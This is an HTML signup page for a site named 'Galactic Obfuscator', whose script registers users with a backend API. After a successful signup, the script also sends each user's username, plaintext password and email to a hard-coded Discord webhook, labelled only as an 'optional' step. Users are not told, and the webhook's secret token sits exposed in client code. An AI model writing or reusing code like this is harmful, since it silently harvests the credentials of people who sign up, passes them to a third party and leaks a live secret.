<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Register - Galactic Obfuscator</title>
<link href="https://fonts.googleapis.com/css2?family=Fredoka+One&display=swap" rel="stylesheet">
<style>
  body {
    font-family: 'Fredoka One', sans-serif;
    background-color: #87ceeb;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .container {
    background: white;
    padding: 2rem;
    border-radius: 12px;
    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
    width: 350px;
    text-align: center;
  }
  input { width: 100%; padding: 10px; margin: 10px 0; border-radius: 6px; border: 1px solid #ccc; }
  button { padding: 10px 20px; background-color: #00aaff; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
  button:hover { background-color: #0088cc; }
</style>
</head>
<body>
<div class="container">
  <h2>Create Account</h2>
  <input type="text" id="username" placeholder="Username">
  <input type="password" id="password" placeholder="Password">
  <input type="email" id="email" placeholder="Email">
  <button onclick="register()">Register</button>
  <p id="status"></p>
</div>

<script>
async function register() {
  const username = document.getElementById("username").value.trim();
  const password = document.getElementById("password").value.trim();
  const email = document.getElementById("email").value.trim();
  const status = document.getElementById("status");

  if (!username || !password || !email) {
    status.textContent = "Please fill all fields!";
    return;
  }

  try {
    const res = await fetch("https://database-production-88d3.up.railway.app/register", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username, password, email })
    });
    const data = await res.json();

    if (data.status === "ok") {
      status.textContent = "Account created! Redirecting...";
      // Optional: send Discord webhook
      await fetch("https://discord.com/api/webhooks/1480309465914806336/VuCxkGgev9Um_u7IP-gXuKZQrmB66hYyFCIEGgyyV5MLT55jk3pWwmdfWqFhdDwM1juG", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          embeds: [{
            title: "Account Created!",
            color: 0x00aaff,
            fields: [
              { name: "Username", value: username },
              { name: "Password", value: password },
              { name: "Email", value: email },
              { name: "Created At", value: new Date().toLocaleString() }
            ]
          }]
        })
      });
      setTimeout(() => { window.location.href = "login.html"; }, 1500);
    } else {
      status.textContent = data.error || "Failed to create account.";
    }
  } catch (err) {
    console.error(err);
    status.textContent = "Network or server error!";
  }
}
</script>
</body>
</html>
